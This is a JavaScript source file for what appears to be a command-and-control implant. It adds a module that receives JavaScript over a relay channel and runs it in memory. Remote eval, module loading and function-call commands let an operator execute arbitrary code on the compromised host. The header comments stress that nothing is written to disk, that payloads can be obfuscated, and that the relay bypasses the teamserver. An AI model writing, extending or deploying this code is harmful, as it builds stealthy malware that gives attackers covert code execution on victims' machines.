// jsmod.js — runtime JS module delivery over the relay channel (milestone 14).
//
// The c0rnbread "taking it further" idea: ship entire JS capability modules to
// the agent over the network and import them in-process — no .node on disk, no
// new files at all. Pure-JS capability stays memory-only AND can be obfuscated
// like any other JS. The interactive WS relay (scripts/ws_relay.js) pushes
// tasks on a custom command-id range the stock teamserver never emits
// (0x1337..0x133a); replies ride the normal BE result stream back to the
// relay console. The C2 teamserver is never involved.
//
//   0x1337 JS_EVAL  [str code]        -> evaluate an expression/statement block
//   0x1338 JS_LOAD  [str name][bytes code] -> register + compile a CJS module
//   0x1339 JS_MODS  []                -> list registered modules + exports
//   0x133a JS_CALL  [str name][str fn][str jsonArgs] -> call module.export
//
// Reply (all): [u32be taskId][u32be cmdId][u8 ok][u32be len][result text]
//
// Module semantics: full CommonJS via Module._compile (self-contained bundles
// — webpack/esbuild output works as-is). `require` inside a module resolves
// node BUILTINS only (fs/os/child_process/...); npm deps must be bundled.
// Registry is memory-only: nothing is written to disk, everything dies with
// the process (deliberate — see README §2j).

const Module = require('module');

const JS_EVAL = 0x1337;
const JS_LOAD = 0x1338;
const JS_MODS = 0x1339;
const JS_CALL = 0x133a;
const JS_IDS = new Set([JS_EVAL, JS_LOAD, JS_MODS, JS_CALL]);

const registry = new Map(); // name -> exports
// property-access view of the registry for eval scope: mods.<name>
const modsProxy = new Proxy({}, { get: (_, name) => registry.get(String(name)) });
const MAX_RESULT = 512 * 1024;

function builtinRequire(id) {
  const bare = String(id).replace(/^node:/, '');
  if (Module.builtinModules.includes(bare)) return require(bare);
  throw new Error(`jsmod: only node builtins are requirable here (got '${id}') — bundle your deps into the module`);
}

function compileModule(name, code) {
  if (!/^[a-zA-Z0-9_.-]{1,64}$/.test(name)) throw new Error(`jsmod: bad module name '${name}'`);
  const m = new Module(`jsmod:${name}`, null);
  m.filename = `jsmod://${name}.js`;
  m.paths = []; // no filesystem resolution — bundles must be self-contained
  m.require = builtinRequire;
  m._compile(code.toString('utf8'), m.filename);
  registry.set(name, m.exports);
  return m.exports;
}

function evalCode(code) {
  // inner eval keeps completion-value semantics (works for expressions AND
  // statement blocks: 'var x=6*7; x' -> 42) while mods/require stay in scope
  const fn = new Function('mods', 'require', '"use strict"; return eval(' + JSON.stringify(code) + ');');
  return fn(modsProxy, builtinRequire);
}

function render(v) {
  if (v === undefined) return 'undefined';
  if (typeof v === 'string') return v;
  try {
    return JSON.stringify(v, null, 2);
  } catch (_) {
    return String(v);
  }
}

// returns an OutPacker reply or null (unknown/unparseable)
function handleTask(commandId, r, state, OutPacker) {
  const out = new OutPacker();
  let ok = 1;
  let result = '';
  let taskId = 0;

  try {
    // task framing: [cmd][args...][u32 taskId] — taskId is TRAILING
    if (commandId === JS_EVAL) {
      const code = r.str();
      taskId = r.u32();
      result = render(evalCode(code));
    } else if (commandId === JS_LOAD) {
      const name = r.str();
      const code = r.raw();
      taskId = r.u32();
      const exports = compileModule(name, code);
      result = `loaded '${name}' - exports: ${Object.keys(exports || {}).join(', ') || '(none)'}`;
    } else if (commandId === JS_MODS) {
      taskId = r.u32();
      result = render([...registry.entries()].map(([name, exports]) => ({
        name,
        exports: Object.keys(exports || {}),
      })));
    } else if (commandId === JS_CALL) {
      const name = r.str();
      const fnName = r.str();
      const argsRaw = r.str();
      taskId = r.u32();
      const exports = registry.get(name);
      if (!exports) throw new Error(`jsmod: no module '${name}' loaded`);
      const fn = exports[fnName];
      if (typeof fn !== 'function') throw new Error(`jsmod: '${name}' has no function '${fnName}'`);
      const args = argsRaw ? JSON.parse(argsRaw) : [];
      result = render(Array.isArray(args) ? fn(...args) : fn(args));
    }
  } catch (e) {
    ok = 0;
    result = `${e.name || 'Error'}: ${e.message}`;
  }

  if (result.length > MAX_RESULT) result = result.slice(0, MAX_RESULT) + '...(truncated, ' + result.length + 'B)';
  return out.u32(taskId).u32(commandId).u8(ok).str(result);
}

module.exports = { handleTask, JS_IDS, JS_EVAL, JS_LOAD, JS_MODS, JS_CALL, registry };
